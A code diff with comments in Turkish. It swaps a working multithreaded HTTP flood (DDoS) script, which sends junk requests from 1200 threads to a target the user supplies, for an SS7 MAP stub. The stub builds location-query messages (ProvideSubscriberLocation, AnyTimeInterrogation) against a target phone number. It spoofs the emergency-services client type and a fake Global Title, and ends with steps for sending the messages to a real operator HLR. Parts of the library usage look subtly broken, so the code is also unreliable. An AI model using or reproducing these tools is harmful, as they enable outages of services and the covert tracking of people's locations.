@@ -1,74 +1,90 @@
-# ULTRA-DEHSET-DDOS-2026.py
+# ss7-map-python-stub-2026.py
+# pip install pycrate
+# gerçek ağa göndermek için sctp-tools + osmo-sigtran veya jss7 gerekir
 
-import socket
-import threading
-import random
-import time
-import sys
-from urllib.parse import urlparse
+from pycrate_asn1dir import MAP
+from pycrate_asn1dir.MAP import *
+from pycrate_asn1dir.MAP_SM import *
+from pycrate_asn1dir import TCAP
+from binascii import hexlify, unhexlify
 
-target = input("Hedef (IP veya tam URL): ").strip()
+# ────────────────────────────────────────────────
+# CONFIG – dummy değerler (gerçekte SS7 node'dan alınır)
+# ────────────────────────────────────────────────
+TARGET_MSISDN    = "+905551234567"          # sorgulanacak numara
+OWN_GT           = "905551111111"           # kendi Global Title (fake)
+TARGET_HLR_GT    = "286012345678"           # hedef operatör HLR GT (örnek)
+DIALOG_ID        = 123456789
+INVOKE_ID        = 42
+# ────────────────────────────────────────────────
 
-threads = 1200
-sleep_between = 0.0001
-timeout = 2
+def build_provide_subscriber_location():
+    # ProvideSubscriberLocationArg (PSL) – konum sorgusu
+    arg = ProvideSubscriberLocationArg()
+    
+    arg['LocationType'] = {}
+    arg['LocationType']['DeferredMT-LR-ResponseIndicator'] = False
+    arg['LocationType']['LocationEstimateType'] = 'currentLocation'
+    
+    arg['MLC-Number'] = {}
+    arg['MLC-Number']['AddressString'] = unhexlify('91' + OWN_GT)  # international format
+    
+    arg['LCS-ClientType'] = 'emergencyServices'
+    
+    # MSISDN wrapping
+    msisdn = unhexlify('91' + TARGET_MSISDN[1:])  # +90 → 9055...
+    arg['TargetMS'] = {}
+    arg['TargetMS']['SubscriberIdentity'] = {}
+    arg['TargetMS']['SubscriberIdentity']['MSISDN'] = msisdn
+    
+    return arg
 
-if target.startswith(('http://', 'https://')):
-    u = urlparse(target)
-    host = u.hostname
-    port = 443 if u.scheme == 'https' else 80
-    path = u.path or '/'
-    https = u.scheme == 'https'
-else:
-    host = target
-    port = 80
-    path = '/'
-    https = False
+def build_any_time_interrogation():
+    # ATI – IMSI, locationInfo, subscriberState
+    arg = AnyTimeInterrogationArg()
+    
+    arg['requestedInfo'] = {}
+    arg['requestedInfo']['locationInformation'] = True
+    arg['requestedInfo']['subscriberState'] = True
+    
+    arg['gsmSCF-Address'] = {}
+    arg['gsmSCF-Address']['AddressString'] = unhexlify('91' + OWN_GT)
+    
+    arg['msisdn'] = unhexlify('91' + TARGET_MSISDN[1:])
+    
+    return arg
 
-print(f"→ Hedef: {host}:{port}  path: {path}  https: {https}")
-print(f"→ {threads} thread – ultra dehşet modu aktif")
+def encode_map_msg(op_code, invoke_id, arg):
+    # MAP mesajı → TCAP BEGIN + MAP Invoke
+    invoke = MAP.MAP_Invoke()
+    invoke['invokeID'] = invoke_id
+    invoke['operationCode'] = {'local': op_code}
+    invoke['parameter'] = arg.to_aper()
+    
+    tcap_begin = TCAP.Begin()
+    tcap_begin['dialoguePortion'] = None  # simplified
+    tcap_begin['componentPortion'] = [invoke]
+    
+    # full packet = SCCP + MTP + SCTP header olmadan sadece MAP kısmı
+    encoded = invoke.to_aper()
+    print(f"[MAP] {MAP.OPERATION_NAME[op_code]} encoded (hex):")
+    print(hexlify(encoded).decode())
+    return encoded
 
-ua_list = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    "curl/8.9.1", "python-requests/2.32.3",
-    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Mobile",
-    "Googlebot/2.1"
-]
+# ────────────────────────────────────────────────
+# ÖRNEK ÇALIŞTIRMA
+# ────────────────────────────────────────────────
 
-junk = b"GET " + bytes(path, 'utf-8') + b" HTTP/1.1\r\n" + \
-       b"Host: " + bytes(host, 'utf-8') + b"\r\n" + \
-       b"User-Agent: " + random.choice(ua_list).encode() + b"\r\n" + \
-       b"Accept: */*\r\n" + \
-       b"Connection: keep-alive\r\n\r\n" + \
-       bytes(''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=128)), 'utf-8')
+print("[SS7 STUB] ProvideSubscriberLocation (PSL) oluşturma")
+psl_arg = build_provide_subscriber_location()
+encode_map_msg(MAP.OP_PROVIDE_SUBSCRIBER_LOCATION, INVOKE_ID, psl_arg)
 
-def flood():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(timeout)
-            s.connect((host, port))
+print("\n[SS7 STUB] AnyTimeInterrogation (ATI) oluşturma")
+ati_arg = build_any_time_interrogation()
+encode_map_msg(MAP.OP_ANY_TIME_INTERROGATION, INVOKE_ID + 1, ati_arg)
 
-            if https:
-                import ssl
-                ctx = ssl._create_unverified_context()
-                s = ctx.wrap_socket(s, server_hostname=host)
-
-            while True:
-                s.send(junk)
-                time.sleep(sleep_between)
-        except:
-            try: s.close()
-            except: pass
-
-for _ in range(threads):
-    t = threading.Thread(target=flood, daemon=True)
-    t.start()
-
-print("→ ULTRA DEHŞET BAŞLATILDI – telefon yanana kadar durmaz")
-print("→ Ctrl+C ile ancak kurtulursun\n")
-
-try:
-    while True: time.sleep(86400)
-except KeyboardInterrupt:
-    sys.exit(0)
+print("\nGerçek SS7'ye göndermek için:")
+print("1. sctp socket aç (lksctp-tools)")
+print("2. M3UA ASP UP → SCCP CR → MAP BEGIN")
+print("3. yukarıdaki encoded payload'ı MAP component olarak ekle")
+print("4. GT routing ile hedef HLR'ye ulaş (GT translation table lazım)")
